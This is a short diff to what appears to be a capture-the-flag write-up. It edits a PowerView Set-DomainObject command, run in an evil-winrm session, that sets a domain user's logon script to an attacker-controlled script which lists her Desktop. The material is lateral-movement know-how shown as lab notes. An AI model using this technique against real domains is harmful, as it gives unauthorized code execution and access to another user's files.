@@ -331,7 +331,7 @@ evil-winrm-py PS C:\programdata> echo "dir C:\Users\maria\Desktop > C:\ProgramDa
 Ill make a file that takes whats in her desktop and and saves it to a file
 
 ```python
-evil-winrm-py PS C:\programdata> Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
+evil-winrm-py PS C:\programdata> Set-DomainObject maria -Set @{'scriptpath'='C:\\ProgramData\\desktop.ps1'} -Verbose
 ```
 
 Then ill set my script as her logon script that should hopefully run
